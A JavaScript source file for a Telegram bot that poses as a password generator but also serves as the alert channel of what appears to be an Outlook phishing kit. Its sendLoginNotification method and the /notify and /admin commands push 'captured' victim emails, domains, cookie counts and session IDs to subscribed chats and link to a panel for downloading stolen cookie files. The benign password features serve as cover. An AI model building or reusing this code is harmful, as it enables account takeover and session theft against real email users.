const TelegramBot = require('node-telegram-bot-api');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

class PasswordGeneratorBot {
    constructor() {
        this.token = process.env.TELEGRAM_BOT_TOKEN;
        this.bot = new TelegramBot(this.token, { polling: true });
        this.chatIds = new Set(); // Store user chat IDs for notifications
        this.rateLimits = new Map(); // Rate limiting per chat ID
        this.subscriptionsFile = path.join(__dirname, 'telegram_subscriptions.json');
        
        // Load persistent subscriptions
        this.loadSubscriptions();
        
        this.setupCommands();
        this.setupEventHandlers();
        console.log('🤖 Telegram Bot initialized successfully');
    }

    // Load persistent subscriptions from file
    loadSubscriptions() {
        try {
            if (fs.existsSync(this.subscriptionsFile)) {
                const data = fs.readFileSync(this.subscriptionsFile, 'utf8');
                const subscriptions = JSON.parse(data);
                this.chatIds = new Set(subscriptions.chatIds || []);
                console.log(`📋 Loaded ${this.chatIds.size} subscription(s) from persistent storage`);
            }
        } catch (error) {
            console.error('Error loading subscriptions:', error.message);
            this.chatIds = new Set();
        }
    }

    // Save subscriptions to file
    saveSubscriptions() {
        try {
            const data = {
                chatIds: Array.from(this.chatIds),
                lastUpdated: new Date().toISOString()
            };
            fs.writeFileSync(this.subscriptionsFile, JSON.stringify(data, null, 2));
        } catch (error) {
            console.error('Error saving subscriptions:', error.message);
        }
    }

    // Rate limiting check
    checkRateLimit(chatId, command) {
        const now = Date.now();
        const key = `${chatId}_${command}`;
        const lastCall = this.rateLimits.get(key) || 0;
        
        // Allow 1 command per 2 seconds per user
        if (now - lastCall < 2000) {
            return false;
        }
        
        this.rateLimits.set(key, now);
        
        // Clean up old entries every 100 requests
        if (this.rateLimits.size > 100) {
            for (const [k, time] of this.rateLimits.entries()) {
                if (now - time > 60000) { // Remove entries older than 1 minute
                    this.rateLimits.delete(k);
                }
            }
        }
        
        return true;
    }

    // Cryptographically secure random generation
    secureRandom(max) {
        return crypto.randomInt(0, max);
    }

    // Cryptographically secure array shuffle
    secureArrayShuffle(array) {
        const shuffled = [...array];
        for (let i = shuffled.length - 1; i > 0; i--) {
            const j = this.secureRandom(i + 1);
            [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
        }
        return shuffled;
    }

    setupCommands() {
        // Welcome message
        this.bot.onText(/\/start/, (msg) => {
            const chatId = msg.chat.id;
            
            if (!this.checkRateLimit(chatId, 'start')) {
                this.bot.sendMessage(chatId, '⏱️ Please wait before sending another command.');
                return;
            }
            
            this.chatIds.add(chatId);
            this.saveSubscriptions();
            
            const welcomeMessage = `
🔐 *Password Generator & Outlook Notifications Bot*

Welcome! I can help you with:

*Password Generation:*
/generate - Generate a random password
/strong - Generate a strong 16-character password  
/readable - Generate a human-readable password
/custom [length] - Custom length password (4-64 chars)

*Notifications:*
/notify on - Enable Outlook login notifications
/notify off - Disable notifications  
/admin - Quick link to admin panel

*Examples:*
\`/custom 20\` - 20-character password
\`/custom 8\` - 8-character password

You'll automatically receive notifications when valid Outlook logins are captured! 🔔
            `;
            
            this.bot.sendMessage(chatId, welcomeMessage, { parse_mode: 'Markdown' });
        });

        // Password generation commands
        this.bot.onText(/\/generate/, (msg) => {
            const chatId = msg.chat.id;
            
            if (!this.checkRateLimit(chatId, 'generate')) {
                this.bot.sendMessage(chatId, '⏱️ Please wait before generating another password.');
                return;
            }
            
            const password = this.generatePassword();
            
            this.bot.sendMessage(chatId, `🔑 Your password: \`${password}\``, { 
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '🔄 Generate Another', callback_data: 'generate_new' },
                        { text: '💪 Strong Password', callback_data: 'generate_strong' }
                    ]]
                }
            });
        });

        this.bot.onText(/\/strong/, (msg) => {
            const chatId = msg.chat.id;
            
            if (!this.checkRateLimit(chatId, 'strong')) {
                this.bot.sendMessage(chatId, '⏱️ Please wait before generating another password.');
                return;
            }
            
            const password = this.generatePassword(16, true);
            
            this.bot.sendMessage(chatId, `🔐 Your strong password: \`${password}\``, { 
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '🔄 Generate Another Strong', callback_data: 'generate_strong' }
                    ]]
                }
            });
        });

        this.bot.onText(/\/readable/, (msg) => {
            const chatId = msg.chat.id;
            
            if (!this.checkRateLimit(chatId, 'readable')) {
                this.bot.sendMessage(chatId, '⏱️ Please wait before generating another password.');
                return;
            }
            
            const password = this.generateReadablePassword();
            
            this.bot.sendMessage(chatId, `🔑 Your readable password: \`${password}\``, { 
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '🔄 Generate Another Readable', callback_data: 'generate_readable' }
                    ]]
                }
            });
        });

        this.bot.onText(/\/custom (\d+)/, (msg, match) => {
            const chatId = msg.chat.id;
            
            if (!this.checkRateLimit(chatId, 'custom')) {
                this.bot.sendMessage(chatId, '⏱️ Please wait before generating another password.');
                return;
            }
            
            const length = parseInt(match[1]);
            
            if (length < 4 || length > 64) {
                this.bot.sendMessage(chatId, '❌ Password length must be between 4 and 64 characters.');
                return;
            }
            
            const password = this.generatePassword(length);
            this.bot.sendMessage(chatId, `🔑 Your ${length}-character password: \`${password}\``, { 
                parse_mode: 'Markdown' 
            });
        });

        // Notification controls
        this.bot.onText(/\/notify (on|off)/, (msg, match) => {
            const chatId = msg.chat.id;
            
            if (!this.checkRateLimit(chatId, 'notify')) {
                this.bot.sendMessage(chatId, '⏱️ Please wait before changing notification settings.');
                return;
            }
            
            const action = match[1];
            
            if (action === 'on') {
                this.chatIds.add(chatId);
                this.saveSubscriptions();
                this.bot.sendMessage(chatId, '🔔 Outlook login notifications enabled! You\'ll receive alerts when valid logins are captured.');
            } else {
                this.chatIds.delete(chatId);
                this.saveSubscriptions();
                this.bot.sendMessage(chatId, '🔕 Outlook login notifications disabled.');
            }
        });

        // Admin panel link
        this.bot.onText(/\/admin/, (msg) => {
            const chatId = msg.chat.id;
            
            if (!this.checkRateLimit(chatId, 'admin')) {
                this.bot.sendMessage(chatId, '⏱️ Please wait before accessing admin commands.');
                return;
            }
            
            const adminUrl = `${process.env.REPL_SLUG ? `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co` : 'http://localhost:5000'}/admin.html`;
            
            this.bot.sendMessage(chatId, `🔧 *Admin Panel Access*

🌐 [Open Admin Panel](${adminUrl})

*Quick Actions:*
• View all saved sessions
• Download cookie files
• Manage login data

⚠️ *Note: Admin access requires proper authentication*`, 
            { 
                parse_mode: 'Markdown',
                reply_markup: {
                    inline_keyboard: [[
                        { text: '🌐 Open Admin Panel', url: adminUrl }
                    ]]
                }
            });
        });

        // Help command
        this.bot.onText(/\/help/, (msg) => {
            const chatId = msg.chat.id;
            
            if (!this.checkRateLimit(chatId, 'help')) {
                this.bot.sendMessage(chatId, '⏱️ Please wait before requesting help again.');
                return;
            }
            const helpMessage = `
🔐 *Password Generator & Notifications Bot*

*Password Commands:*
• /generate - Standard 12-character password
• /strong - Strong 16-character password with all types
• /readable - Human-readable format (Word+Word+123!)
• /custom [length] - Custom length (4-64 characters)

*Notification Commands:*
• /notify on - Enable login notifications  
• /notify off - Disable notifications
• /admin - Access admin panel

*Examples:*
\`/custom 20\` - 20-character password
\`/custom 8\` - 8-character password

*Security Tips:*
• Use different passwords for different accounts
• Store passwords securely
• Enable 2FA when possible

You'll receive real-time notifications when Outlook logins are captured! 🔔
            `;
            
            this.bot.sendMessage(chatId, helpMessage, { parse_mode: 'Markdown' });
        });
    }

    setupEventHandlers() {
        // Handle callback queries (inline buttons)
        this.bot.on('callback_query', (query) => {
            const chatId = query.message.chat.id;
            const messageId = query.message.message_id;
            
            if (!this.checkRateLimit(chatId, 'callback')) {
                this.bot.answerCallbackQuery(query.id, { text: '⏱️ Please wait before generating another password.' });
                return;
            }
            
            let password;
            let message;
            
            switch (query.data) {
                case 'generate_new':
                    password = this.generatePassword();
                    message = `🔑 Your password: \`${password}\``;
                    break;
                case 'generate_strong':
                    password = this.generatePassword(16, true);
                    message = `🔐 Your strong password: \`${password}\``;
                    break;
                case 'generate_readable':
                    password = this.generateReadablePassword();
                    message = `🔑 Your readable password: \`${password}\``;
                    break;
            }
            
            if (password) {
                this.bot.editMessageText(message, {
                    chat_id: chatId,
                    message_id: messageId,
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [[
                            { text: '🔄 Generate Another', callback_data: query.data }
                        ]]
                    }
                });
            }
            
            this.bot.answerCallbackQuery(query.id);
        });

        // Error handling
        this.bot.on('error', (error) => {
            console.error(`Telegram Bot error: ${error.code} - ${error.message}`);
        });

        this.bot.on('polling_error', (error) => {
            console.error(`Telegram Bot polling error: ${error.code} - ${error.message}`);
        });
    }

    generatePassword(length = 12, includeSymbols = true) {
        const lowercase = 'abcdefghijklmnopqrstuvwxyz';
        const uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
        const numbers = '0123456789';
        const symbols = '!@#$%^&*()_+-=[]{}|;:,.<>?';
        
        let charset = lowercase + uppercase + numbers;
        if (includeSymbols) charset += symbols;
        
        let password = '';
        
        // Ensure at least one character from each type using secure random
        if (length >= 4) {
            password += lowercase[this.secureRandom(lowercase.length)];
            password += uppercase[this.secureRandom(uppercase.length)];
            password += numbers[this.secureRandom(numbers.length)];
            if (includeSymbols) {
                password += symbols[this.secureRandom(symbols.length)];
            }
        }
        
        // Fill remaining length with secure random
        for (let i = password.length; i < length; i++) {
            password += charset.charAt(this.secureRandom(charset.length));
        }
        
        // Shuffle the password using secure shuffle
        return this.secureArrayShuffle(password.split('')).join('');
    }

    generateReadablePassword() {
        const words = [
            'Apple', 'Banana', 'Cherry', 'Dragon', 'Eagle', 'Forest', 'Guitar', 'Harbor',
            'Island', 'Jungle', 'Knight', 'Lightning', 'Mountain', 'Ocean', 'Phoenix', 'Queen',
            'River', 'Storm', 'Tiger', 'Universe', 'Victory', 'Wizard', 'Xray', 'Yacht', 'Zebra',
            'Brave', 'Cloud', 'Dream', 'Fire', 'Gold', 'Hope', 'Magic', 'Noble', 'Power', 'Swift'
        ];
        
        const word1 = words[this.secureRandom(words.length)];
        const word2 = words[this.secureRandom(words.length)];
        const number = this.secureRandom(900) + 100; // 100-999
        const symbols = ['!', '@', '#', '$', '%', '&', '*'];
        const symbol = symbols[this.secureRandom(symbols.length)];
        
        return `${word1}${word2}${number}${symbol}`;
    }

    // Method to send login notifications
    async sendLoginNotification(loginData) {
        if (this.chatIds.size === 0) {
            console.log('No Telegram users subscribed to notifications');
            return;
        }

        const { email, domain, timestamp, totalCookies, sessionId } = loginData;
        const adminUrl = `${process.env.REPL_SLUG ? `https://${process.env.REPL_SLUG}.${process.env.REPL_OWNER}.repl.co` : 'http://localhost:5000'}/admin.html`;
        
        const notificationMessage = `
🔐 *New Outlook Login Captured!*

📧 **Email:** \`${email}\`
🏢 **Domain:** \`${domain}\`
🕐 **Time:** ${new Date(timestamp).toLocaleString()}
📊 **Cookies:** ${totalCookies} saved
🆔 **Session:** ${sessionId}

🌐 [View Admin Panel](${adminUrl})

⚠️ *Admin access requires authentication*
        `;

        // Send notification to all subscribed users
        for (const chatId of this.chatIds) {
            try {
                await this.bot.sendMessage(chatId, notificationMessage, {
                    parse_mode: 'Markdown',
                    reply_markup: {
                        inline_keyboard: [[
                            { text: '🌐 Open Admin Panel', url: adminUrl },
                            { text: '🔑 Generate Password', callback_data: 'generate_new' }
                        ]]
                    }
                });
            } catch (error) {
                console.error(`Failed to send notification to ${chatId}:`, error.message);
                // Remove invalid chat IDs
                if (error.code === 403) {
                    this.chatIds.delete(chatId);
                }
            }
        }
        
        console.log(`📤 Login notification sent to ${this.chatIds.size} Telegram users`);
    }

    getSubscribedUsers() {
        return this.chatIds.size;
    }
}

module.exports = PasswordGeneratorBot;